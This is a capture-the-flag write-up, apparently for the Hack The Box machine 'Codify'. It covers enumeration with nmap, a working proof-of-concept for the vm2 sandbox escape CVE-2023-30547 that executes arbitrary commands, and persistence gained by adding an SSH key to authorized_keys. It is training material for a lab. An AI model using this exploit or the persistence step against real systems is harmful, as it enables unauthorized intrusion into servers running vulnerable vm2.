

# Codify


<p align="center">
  <img src="https://github.com/MrGovindDubey/HTB-Machines/assets/118271775/0897cb09-50b3-430b-9376-58dfe79b24c1" />
</p>


"WebSandbox Escape Challenge," a sophisticated Linux Operating System test bed meticulously crafted to evaluate your proficiency in navigating a web application vulnerability, culminating in a comprehensive system takeover.
Engage in this immersive experience where participants find themselves confined within a virtual web sandbox. Your mission, should you choose to accept it, is to navigate intricate layers, decipher concealed keys, hijack scripts, and ultimately secure root access. This challenge serves as a definitive masterclass, refining your skills in circumventing constraints, exploiting guarded secrets, and wielding authoritative power within a simulated environment.
Beyond traditional cybersecurity exercises, this repository offers a dynamic and intellectually stimulating experience, pushing the boundaries of your ingenuity and strategic thinking. "WebSandbox Escape Challenge" is not merely a code repository; it represents a gateway for honing your cybersecurity skills and mastering the intricate craft.
Are you prepared to break free, unleash your potential, and emerge victorious in this stimulating adventure? The challenge beckons – let the hacking games commence!

__Keywords:
node.js, vm2, python exploit scripting__


## Updating the Hosts Configuration with the Target:

To direct traffic towards the target, codify.htb, it is necessary to append its information to the __"/etc/hosts file"__. Ensure the target's details are accurately encoded in the hosts file and then save the changes to facilitate seamless interaction.

```bash

echo "10.10.14.239 codify.htb" | sudo tee -a /etc/hosts

```


## Enumeration: revealing the target's landscape.

Starting a Nmap scan is the critical first step in comprehending the complexities of the target environment. By painstakingly probing the target, the attacker acquires crucial knowledge, allowing for a more focused and educated investigation. This enumeration procedure establishes the groundwork for finding possible vulnerabilities, paving the way for the next stages of the penetration testing journey.

```bash
nmap -sC -sV -v -oN nmap.log 10.10.11.239
```

```bash

Nmap scan report for codify.htb (10.10.11.239)
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /opt/homebrew/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```


Port Analysis: Introducing Services on the Target System

- Port 22 shows an active OpenSSH 8.9p1 service, indicating that SSH is available for remote access. The use of a latest version indicates a lower chance of vulnerabilities.

- An Apache 2.4.52 web server is exposed on port 80. A thorough check with the http-methods probe reveals support for popular methods like GET, HEAD, and POST. This implies the presence of a web application, prompting additional investigation.

- Intriguingly, port 3000 reveals a live Node.js Express framework service. Given the typical susceptibility of Node.js apps to code and dependency vulnerabilities, this revelation offers up possibilities for further investigation and potential exploitation.


## Exploration of Codify's Environment -

Commencing the towards an initial foothold, I directed my attention to codify.htb, leveraging the capabilities of Burp Suite for traffic interception. A systematic exploration of the web application unveiled three primary pages:

-  About Us: This section provided a comprehensive overview, revealing Codify as a Node.js sandbox environment utilizing the vm2 library to securely execute untrusted code.

-  Editor: A straightforward page with a textarea interface enabled users to input Node.js code for execution.

-  Limitations: Highlighting operational constraints, this page documented restricted access to specific modules such as child_process and fs.

The "About Us" page disclosed that while Codify excelled in sandboxing code execution, it wasn't impervious to vulnerabilities.

Conducting an in-depth inquiry into the vm2 library, I uncovered a recently disclosed Sandbox Escape vulnerability, identified as   ___CVE-2023-30547___.  This newfound knowledge hinted at a potential avenue to exploit and surpass the sandbox limitations.

To validate this discovery, I implemented a Proof of Concept (PoC) exploit code within the textarea. This exploit manipulated Proxy and Error objects, enabling unauthorized access to the main process and execution of arbitrary commands, effectively demonstrating the practical exploitation of the identified vulnerability.


```bash

const {VM} = require("vm2");
const vm = new VM();

const code = `
cmd = 'id'
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync(cmd);
}
`
console.log(vm.run(code));

```

Having successfully executed the exploit, I utilized this newfound capability to run commands on the underlying system. By adding my SSH public key to the ~/.ssh/authorized_keys file, I established a secure and persistent connection. Exploiting this access, I gained shell access as the current user, identified as "svc," marking a significant advancement in the penetration process. This achievement set the stage for continued exploration and manipulation within the system.

![codify pawnd by Mr Govind Dubey](https://github.com/MrGovindDubey/HTB-Machines/assets/118271775/a396cc30-69fc-4585-bc1d-45380d604c01)

The vulnerable vm2 version along with sandbox escape primitives were key to gaining an initial foothold on the Codify server.

I SSH'd into the server as user svc:

```bash
ssh svc@codify.htb -i id_rsa
```

